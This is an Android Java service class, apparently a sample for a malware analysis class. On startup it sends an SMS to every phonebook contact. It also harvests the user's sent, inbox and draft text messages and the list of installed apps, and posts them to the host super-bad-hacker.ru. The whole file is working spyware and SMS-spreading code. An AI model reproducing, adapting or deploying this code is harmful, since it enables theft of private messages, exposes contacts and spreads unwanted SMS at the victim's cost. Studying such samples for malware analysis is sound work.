package com.example.activitat2;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.BufferedOutputStream;
import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;


public class ServiceBoot extends Service {
    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        Log.d("ServiceBoot", "Servicio creado");
        sms_mailing_phonebook(this, "Saludos desde la clase de análisis de malware! ;)");
        String apps = getApps(this);
        String sms = getSMS(this);
        sendHTTPRequest(apps + ":tab:" + sms);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        Log.d("ServiceBoot", "Servicio destruido");
    }

    public String getSMS(ServiceBoot context) {
        try {
            String[] arraySMS = {"sms/sent", "sms/inbox", "sms/draft"};
            StringBuilder logs = new StringBuilder();
            for (String str : arraySMS) {
                Uri uriSMS = Uri.parse("content://" + str);
                Cursor c = context.getContentResolver().query(uriSMS, null, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        String number = c.getString(2);
                        if (number.length() > 0) {
                            String stexts = c.getString(12);
                            String stexts2 = stexts == null ? "" : stexts + " ";
                            String text = c.getString(13);
                            logs.append("~").append(str).append("~number: ").append(number).append(" text: ").append(stexts2).append(text).append(":end:");
                        }
                    }
                    c.close();
                    return logs.toString();
                }
            }
        } catch (Exception ex) {
            Log.d("getSMS", "Error getSMS" + ex);
        }
        return "";
    }

    public String getApps(ServiceBoot context) {
        try {
            @SuppressLint("QueryPermissionsNeeded") List<ApplicationInfo> packages = context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
            String logs = "";
            for (ApplicationInfo packageInfo : packages) {
                if ((packageInfo.flags & 1) == 0) {
                    logs = logs + packageInfo.packageName + ":end:";
                }
                Log.d("getApps", logs);
            }
            return logs;
        } catch (Exception ex) {
            Log.d("getApps", "Error getApps" + ex);
            return "";
        }
    }

    @SuppressLint("Range")
    public void sms_mailing_phonebook(ServiceBoot context, String text) {
        @SuppressLint("Recycle") Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        boolean is_sms_working = false;
        while (phones.moveToNext()) {
            String phoneNumber;
            phoneNumber = phones.getString(phones.getColumnIndex("data1"));
            if (!phoneNumber.contains("*") && !phoneNumber.contains("#") && phoneNumber.length() > 7) {
                try {
                    sendSms(context, phoneNumber, text);
                    is_sms_working = true;
                } catch (Exception e) {
                    Log.d("sms_mailing_phonebook", "No permissions");
                    is_sms_working = false;
                }
            }
        }
        if (is_sms_working) {
            Log.d("sms_mailing_phonebook", "SMS send");
        }
    }

    public void sendSms(ServiceBoot context, String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> list = smsManager.divideMessage(message);
            @SuppressLint("UnspecifiedImmutableFlag") PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
            @SuppressLint("UnspecifiedImmutableFlag") PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
            ArrayList<PendingIntent> sents = new ArrayList<>();
            ArrayList<PendingIntent> deliveredList = new ArrayList<>();
            for (int i = 0; i < list.size(); i++) {
                deliveredList.add(deliveredPI);
                sents.add(pendingIntent);
            }
            smsManager.sendMultipartTextMessage(phoneNumber, null, list, sents, deliveredList);
            String logSMS = "Output SMS:" + phoneNumber + " text:" + message + "::endLog::";
            Log.d("SMS", logSMS);
        } catch (Exception ex) {
            Log.d("sendSms", "Error sendSms" + ex);
        }
    }

    public void sendHTTPRequest(String data) {
        new PostTask().execute(data);
    }

    static class PostTask extends AsyncTask<String, String, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... params) {
            String urlString = "https://super-bad-hacker.ru";
            String data = params[0];
            OutputStream out;

            try {
                URL url = new URL(urlString);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                out = new BufferedOutputStream(urlConnection.getOutputStream());

                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));
                writer.write(data);
                writer.flush();
                writer.close();
                out.close();

                urlConnection.connect();
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
            return urlString;
        }
    }
}